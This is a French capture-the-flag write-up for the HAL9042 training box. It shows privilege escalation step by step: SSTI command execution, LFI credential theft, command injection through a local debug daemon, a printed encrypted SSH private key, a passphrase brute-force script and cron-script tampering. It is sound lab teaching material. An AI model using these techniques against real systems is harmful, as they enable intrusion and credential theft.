# WRITEUP 3 - Boot2Root - Privilege Escalation Details

## Contexte : Box HAL9042, sujet pedagogique de l'Ecole 42  

> [!NOTE] 
> Nous exploiterons dans ce troisieme WriteUp les vulnerabilites exposes dans les 2 premiers pour realiser une privilege escalation. ([Write Up 1](../writeup1/write_up_1.md) && [Write Up 2](../writeup2/write_up_2.md)). Il est recommande d'en prendre connaissance avant de poursuivre.

Je ne detaillerai pas tous les steps d'enumeration utilisateur realisees dans le cadre de ce projet ici car il est possible d'en trouver les traces *(tenues a jour plus ou moins regulierement dans le [LOGBOOK](../utils/LOG_BOOK.md))*  
Toutefois on a une visu de l'escalade a realiser dans la description de l'appliance fournie avec le sujet :  
  
### USERS  

| Ordre | Utilisateur |     | Done ?|
|-------|-------------|-----|-------|
|   1   | www-data    | 💻  |   ✅ [Clic](./write_up_3.md#a-prendre-le-controle-sur-www-data) |
|   2   | paco        | 🔐  |   ✅  [Clic](./write_up_3.md#b-prendre-le-controle-sur-paco)|
|   3   | wil         | 🕵️  |   ✅  [Clic](./write_up_3.md#c-prendre-le-controle-sur-wil)|
|   4   | sophie      | 🧠  |   ✅  [Clic](./write_up_3.md#d-prendre-le-controle-sur-sophie)|
|   5   | ol          | 🛡️  |   ❌  |
|   6   | root        | 👑  |   ❌  |
|*bonus*| xavier      |     |   ❌  |

### RECUPERATION DES `.key_part`

Les `.key_part` vont nous permettre de dechiffrer un rapport de `ol`.  
Le script d'encryption de `paco` : `encrypt.py` nous explique qu'il nous faudra concatener les 4 `.key_part` dans un ordre precis afin de pouvoir dechiffrer le rapport : 

1. `ol`

2. `wil`  

- **Prerequis** : Avoir le pivot `paco -> wil`.
- **Recuperation** : 
    - La `.key_part` de wil se trouve dans le dossier `/home/wil/data`
    - On utilise le pivot pour `cat` la `.key_part` : `echo "DEBUG: cd /home/wil/data && cat .key_part" | nc 127.0.0.1 7042`
- **Resultat** : `847_4n0m4l13s`

3. `sophie`  

- **Prerequis** : Avoir une connexion ssh a la session `sophie`
- **Recuperation** : 
    - Une fois sur la session de `sophie`, la `.key_part` se trouve dans le repertoire : `/home/sophie/drafts/.key_part`.  
    - Depuis la session : `cd drafts/ && cat .key_part`
- **Resultat** : `S0ph13_J14`

4. `xavier`  

- **Prerequis** : A minima pouvoir exploiter la `LFI` presentee dans le Write Up 1. 
- **Recuperation** : 
    - Dans plusieurs fichers systeme ou utilisateurs il y a des mentions faites sur `xavier`.
    - Dans le fichier `encrypt.py` de `paco` on nous donne directement le chemin, `/tmp/.xn/.key_part`pas besoin de complexifier ici, on va utiliser la `LFI`.
    - `./get_file.sh /tmp/.xn/.key_part`
- **Resultat** : `uid1337`.

### FLAGS  
| Number | Flag                                             |
|--------|--------------------------------------------------|
|   1    |   FLAG{n1c3_try_but_th4ts_n0t_h0w_th1s_w0rks}    |
|   2    |                                                  |
|   3    |                                                  |
|   4    |                                                  |
|   5    |                                                  |
|   6    |                                                  |
|   7    |                                                  |
|   8    |                                                  |
|   9    |                                                  |
|   10   |                                                  |

1. **FLAG{n1c3_try_but_th4ts_n0t_h0w_th1s_w0rks}**  

En utilisant la SSTI sur `/evaluate` avec les privileges`/var/www/hal9042` : 
```bash
./post_evaluate.sh "find /var/www/hal9042 -type f -exec grep -Hn '/flag' {} +"
```  
> [!TIP] 
> Parcours recursivement `/var/www/hal9042`, selectionne uniquement les fichier classiques, cherche `/flag` dans leur contenu, en affichant pour chaque occurence le fichier et le numero de ligne, en regroupant dans un grep.  

Output :
```
Project under evaluation: /var/www/hal9042/app.py:81:        &#34;Disallow: /flag\n&#34;
/var/www/hal9042/app.py:82:        &#34;Disallow: /flag.txt\n&#34;
/var/www/hal9042/app.py:92:@app.route(&#34;/flag&#34;)
/var/www/hal9042/app.py:93:@app.route(&#34;/flag.txt&#34;)
/var/www/hal9042/app.py:99:        &#34;The flags are not lying around in /flag.\n&#34;
```
Donc :  
```bash
┌──(kali㉿kali)-[~/boot2root_scripts]
└─$ curl http://10.0.2.2:5042/flag                                                
FLAG{n1c3_try_but_th4ts_n0t_h0w_th1s_w0rks}

HAL9042: I appreciate the optimism.
The flags are not lying around in /flag.
Did you really think it would be that easy?
(I logged this request. I log everything. It's mostly the only thing I do.)
```

Le resultat est le meme sur `http://10.0.2.2:5042/flag.txt`

2. 


## KILL CHAIN

### A. Prendre le controle sur `www-data`

Le controle sur le shell de www-data se prend via `SSTI (Server Side Template Rendering)` exposee dans le [Write Up 2](../writeup2/write_up_2.md).

L'utilisation du script maison `./post_evaluate.sh` permet d'executer des commandes depuis les privileges de cet utilisateur.

```bash
┌──(kali㉿kali)-[~/boot2root_scripts]
└─$ ./post_evaluate.sh "whoami"                                                   
Project under evaluation: www-data
```

### B. Prendre le controle sur `paco`

1. L'enumeration de fichiers user nous permet de recuperer depuis `/home/paco/.env.old` ses credentials :
```bash
┌──(kali㉿kali)-[~/boot2root_scripts]
└─$ ./get_file.sh "/home/paco/.env.old"
# old deploy env — paco. delete this. (you will not delete this)
DB_PASS=Moulinette2024!
SECRET_KEY=hal9042secret
# ssh creds used by the deploy bot
SSH_USER=paco
SSH_PASS=Pac0_H4L_dev!
```  
2. L'enumeration de ports effectuee au debut du projet nous a permis de reperer le port `6060` comme port pour le service `ssh` : 
```bash
┌──(kali㉿kali)-[~]
└─$ ssh -p 6060 paco@10.0.2.2
paco@10.0.2.2's password: Pac0_H4L_dev!
paco@hal9042:~$
```  

### C. Prendre le controle sur `wil`

1. Une fois connecte a la session `paco`, en consultant le `.bash_history`, deux choses sautent aux yeux :
```bash
cd /home/paco/src
gcc -O2 -o /opt/hal9042/daemon evaluator.c <========= ICI
nc 127.0.0.1 7042
echo "DEBUG:id" | nc 127.0.0.1 7042 <======== ET ICI
```  

En analysant `evaluator.c` :  
```c
system(cmd);            /* executes as wil */
```

2. **Le Pivot** : Le daemon `hal9042d` sur le port 7042 n'est accessible qu'en local via `127.0.0.1`. Il possede un handler de debug qui execute la ligne exposee au dessus `system(cmd)` avec les privileges de wil des que la commande entree commence par `DEBUG:`.  
Le pivot est donc realise comme suit :  
```bash
paco@hal9042:~$ echo "DEBUG:whoami" | nc 127.0.0.1 7042
HAL9042 evaluation daemon — v0.4 (build dev)
Submit a project name to evaluate. One line per request.
> wil
> 
```  
> [!TIP]
> Pourquoi on parle d'une execution en "local" ?  
> Le daemon `hal9042d` ecoute uniquement sur `127.0.0.1:7042`.  
> Il est necessaire d'executer la requete depuis la machine cible et non depuis une machine distante.  
> **ATTENTION :** "local" decrit ici l'endroit depuis lequel le service est accessible, et non pas l'utilisateur avec lequel la commande est executee.  
> La commande `whoami` est executee par `hal9042d` via `system(cmd)`. Elle herite donc des privileges du daemon qui tourne sous `wil`.  
> `paco` n'obtient pas directement les privileges de `wil`, c'est l'abus du service local execute par `wil` qui permet a `paco` d'executer sa commande depuis un autre contexte.  

### D. Prendre le controle sur `sophie`

1. `wil` dit dans ses notes `/home/wil/notes/personal_notes.txt` :  
```bash
paco@hal9042:/home/wil/notes$ cat personal_note.txt 
847 evaluations that make no sense. i counted them twice.

i sent sophie three alerts. the first one was calm. the third one wasn't.
the auto-reply said she was out of office. she wasn't. i saw her in the bocal.

== ICI == 
i kept a copy of sophie's old access key, encrypted, just in case the project
got buried with me. the passphrase is something she'd never guess i remembered.
== ICI == 

it's the most common password in the world. she used to laugh at people for it.

i cost more than €0.0003 per evaluation.
i think that's the whole problem, actually.
```

2. Pour pouvoir consulter la copie de la cle ssh de `sophie` sauvegardee par `wil`, il nous faut passer par ses privileges :  
```bash
paco@hal9042:/home/wil/.ssh$ echo "DEBUG: cd /home/wil/.ssh && cat id_rsa_sophie.enc" | nc 127.0.0.1 7042
HAL9042 evaluation daemon — v0.4 (build dev)
Submit a project name to evaluate. One line per request.
> -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAzK+j7jK
N6wuhUaI7mCb46AAAAGAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCdNrsKwY/D
/oCuNh3+IKG5Bw4neOSsx55IdttrIaY8tzB5mupAwOBJTNbbagUkX81Ip9TSUZsETf+RKt
OozxG6nNi4dq7xXInk23xaauE/g/3i2d53IwNqqIUorfj7OJl8ixYOhPsTC8SzsIlsI+/p
lhZUDP6uZ2QhSWuv2wrwFYZ81fCoYO3itEXjV6j1MEmbWdDPpf7kh7S2j2v7UPC1yHI87i
LM+QKJArWp9qHEZbf+6J7eQ3kYdr+9LCK9VQhXeyfndIGoBD0i5P9jwiWaWDA+FJbyvD3Z
JQXvzTZgfNp0TmLBScYm0MNaaztwOZlhhXj77AgxyuMrMbOoTts7AAAD0FHPIvfwDMBNKv
HWPis4v56H83ACJ3Ts+lMQegwERhNaqDKVliePaTED/ZmQ+nxyPOTEpfVowa3ZUP4o3Wo4
Ma2lXZhBpf8LKx5n09GJkc7tBJeGbWXJYeZSGmOXXhlIAgtePuJnjVTmGjBRtxf47NKczR
djV04oU0sxaeog5qiaSPqwgm97zjgepvsXJ/dbK8yhL05C9s9mPiZ8vmKqAkgKQrcBj3XK
igxGM2SwdJxZa/PkG8WOhflZ8fZsSwTlHDH2kgR0mEDE1ctT2EBZDEt0tWXC8t4fWD77+y
c3M+Vqz0UTj28O4x6mn2jbIr34ap2qFgnLs4rzLNkhTClkJz0ROb9cSWEjvOqzfqKY8SOc
X+YM5/w0Os7cTrw9KZWPNT7XjpSf1xi7cz244Ui19D4+LHSf4w9SVCwS5F5Fk46JHxZbsI
X2gWmwxPhOE8qW1bDZhmFRoQEsg1nw/8fxq444p0P6ITztM3Rcne0zEDVNdPEDrjPGBBkb
KjMZWw3KzI6G5vBMeG83zNVqACoJDYzD9neT9DNn7J2KNGJpKaFATirvmTReuwbVf54HrK
19XQ6gV1kv95ny3MXfPYC47RuSqS5lbNXpYaSsTSCdJMe4L52kG+sHG+9sx9KrHckQ7fCu
m5ptzYPU4wNpu/hEIhkKktAHhkTF9Jm1wzySKnu0ashxWXJS8QWNbKMkEOInz5MB3BE0/E
jCCPL7+omqoL6uuOVma19FH4JssGEEcnxgw58pZlpWqsTSOy9lx5OvawMjWMQMkvTJWieR
A0XRISv9vKo/3O8fc0G/DB5oNSX457BPMkMTYPLBXn8AApDP0V8XveIq0iYEHGhFEA5hUr
HdWVP/zzERJA/AxJ50Ek7z+ZPure9+Zzy5FbPmcH73Tj3GKmXr0CEIApXDukXNZpSO+MNz
FGHhM+KwmAHLgHz8HMki3bT+Flk6Ed6smsyVuoJtEq4PJ6FVMWo+Nsa9t5lOkyrxtw1Inr
f0RuItqMv2n40MxLMHThDLLI5Q8QAzMaUMXQuOKYqJ/fUJ7m0DJNUifHDYjDzPhYMma0hG
k2D4rYYKLIghjrT8TuedHvjRODN27P7MkBh7o3/jMV+tdm4BEiweom6NYqmGomNAtX+HNA
jX+YOcpaDKY8fyrcajiLqk0HX+0BLG4m/w1WT7ng1tCUBWRN3nNBGoB2OBnqLTBQ/e63qd
LeAClq9AxRB55haj9LKeFwAv/dNUI28QHHth17q2ycWLiozebTzi5ujFAiZ62cs02b7DO8
nd5ef3HqPILkSJLtE8a2lgNktuuAQ=
-----END OPENSSH PRIVATE KEY-----
> ^C
```
> [!CAUTION]
> Dans mon cas c'etait deja fait, sinon ne pas oublier d'ajouter les perms pour la cle ssh de `sophie` : `chmod 600 id_rsa_sophie.enc`

3. Se connecter avec la passphrase :  
- Les indices suggerent que la passphrase de la cle ssh est l'un des mots de passes les plus communs.  
- J'ai donc mis au point ce script de bruteforce pour pouvoir tester les mots de passe les plus communs pour la passphrase  

`bruteforce.sh` :
```bash
#!/bin/bash

KEY="$1"
WORDLIST="$2"

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <private_key> <wordlist>"
    exit 1
fi

while IFS= read -r password; do
    echo "Testing: [$password]"
    if ssh-keygen -y -P "$password" -f "$KEY" >/dev/null 2>&1; then
        echo "[+] Passphrase trouvée : $password"
        exit 0
    fi
done < "$WORDLIST"

echo "[-] Aucune passphrase trouvée."
exit 1
```
> [!TIP]
> La `WORDLIST` utilisee de mon cote est disponible directement sur les distros kali : `usr/share/john/password.lst`

4. Resultat :  
```bash
┌──(kali㉿kali)-[~]
└─$ ./bruteforce.sh id_rsa_sophie.enc /usr/share/john/password.lst
Testing: [123456]
Testing: [12345]
Testing: [password]
Testing: [password1]
Testing: [123456789]
... [etc]...
... [etc]...
Testing: [iloveyou]
[+] Passphrase trouvee = iloveyou
```  
5. Confirmation :  
```bash
┌──(kali㉿kali)-[~]
└─$ ssh -p 6060 -i id_rsa_sophie.enc sophie@10.0.2.2
Enter passphrase for key 'id_rsa_sophie.enc': iloveyou

sophie@hal9042:~$ 
```

### E. Prendre le controle sur `ol`

1. Depuis la session ssh de `sophie` il est possible de consulter `/home/ol/scripts/check.sh` :  
```bash
sophie@hal9042:/home/ol/scripts$ cat check.sh 
#!/bin/bash
# check.sh — HAL9042 health probe
# Run from ol's crontab every 5 minutes. Writes a heartbeat to the log.
#
# ol: keep this lightweight. it runs as me, every 5 min, forever.

LOG=/var/log/hal9042/check.log
echo "$(date -u +%FT%TZ) [check] hal9042d heartbeat: nominal" >> "$LOG" 2>/dev/null
echo "$(date -u +%FT%TZ) [check] confidence: nominal" >> "$LOG" 2>/dev/null
```  

2. C'est interessant car ce script est joue depuis la crontable de `ol` toutes les 5 minutes, donc avec ses privileges. Il n'est pas possible par exemple de consulter sa `.key_part`, mais les permissions sur le script sont les suivantes :  
```bash
sophie@hal9042:/home/ol/scripts$ ls -la
-rwxrwxr-x 1 ol evalops  380 Jun  6 12:30 check.sh
```  
Les membres du groupe `evalops` possedent les droits `rwx` sur le script.  

3. `wil` fait partie du groupe evalops :
```bash
sophie@hal9042:/home/ol/scripts$ getent group evalops
evalops:x:1001:wil
```

4. Le pivot apparait donc clairement, il faut modifier le script `check.sh` depuis les privileges de `wil`, en essayant par exemple de cat la `.key_part` qui n'est `rw` seulement pour `ol`. Cela permettrait de confirmer l'escalation.

5. **Realisation**  
- Modification du script en append :
```bash
sophie@hal9042:/home/ol/scripts$ echo 'DEBUG:echo "echo \"\$(date -u +%FT%TZ) [KEYPART] \$(cd /home/ol/.config && cat .key_part)\" >> \"\$LOG\"" >> /home/ol/scripts/check.sh' | nc 127.0.0.1 7042
HAL9042 evaluation daemon — v0.4 (build dev)
Submit a project name to evaluate. One line per request.
```

- Verification : 

```bash
sophie@hal9042:/home/ol/.config$ cd ../scripts/ && cat check.sh
#!/bin/bash
# check.sh — HAL9042 health probe
# Run from ol's crontab every 5 minutes. Writes a heartbeat to the log.
#
# ol: keep this lightweight. it runs as me, every 5 min, forever.

LOG=/var/log/hal9042/check.log
echo "$(date -u +%FT%TZ) [check] hal9042d heartbeat: nominal" >> "$LOG" 2>/dev/null
echo "$(date -u +%FT%TZ) [check] confidence: nominal" >> "$LOG" 2>/dev/null
echo "$(date -u +%FT%TZ) [KEYPART] cd /home/ol/.config && cat .key_part" >> "$LOG" ==> OK
```
- On attend l'execution par la crontable depuis les privileges de `ol` :
```bash
2026-09-23T14:15:02Z [KEYPART] M0ul1n3tt3
```